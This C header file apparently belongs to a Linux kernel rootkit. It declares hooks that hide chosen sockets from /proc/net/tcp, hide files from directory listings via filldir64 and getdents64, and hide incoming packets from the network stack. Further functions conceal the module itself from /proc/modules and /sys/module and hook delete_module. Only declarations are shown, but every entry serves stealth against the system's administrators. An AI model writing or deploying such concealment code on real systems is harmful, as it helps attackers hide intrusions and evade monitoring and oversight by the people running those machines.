#pragma once

#include <hook.h>

/// @brief Enable/disable hiding of configured sockets from `/proc/net/tcp*`
HOOK_EXTERN(hide, tcp_seq_next);

/// @brief Enable/disable hiding of configured files from `filldir64`
HOOK_EXTERN(hide, filldir64);

/// @brief Enable/disable hiding of configured files from the syscall `getdents64`
HOOK_X64_SYSCALL_EXTERN(hide, getdents64);

/// @brief Enable/disable hiding of RX packets by configured filters at `netif_receive_skb_list_internal`
HOOK_EXTERN(hide, netif_receive_skb_list);

/// @brief Enable all available methods of hiding this kernel module
void hide_enable_thismodule(void);

/// @brief Enable all available methods of hiding this kernel module
/// @attention Unlike most hides, there is no reason to call this on module_exit
void hide_disable_thismodule(void);

/// @brief Enable hiding this module from the module list in /proc/modules
void hide_enable_proc_module_this(void);

/// @brief Disable hiding this module from the module list in /proc/modules
void hide_disable_proc_module_this(void);

/// @brief Remove this module's directory from /sys/module
void hide_enable_sys_module_this(void);

/// @brief Restore this module's /sys/module directory
/// @attention Not implemented to completely replicate the /sys/module/... directory structure -
///     only enough so that the module can unload with `delete_module`.
void hide_disable_sys_module_this(void);

/// @brief Enable/disable hooking the delete_module syscall to allow rmmod'ing this module.
HOOK_X64_SYSCALL_EXTERN(hide, delete_module);
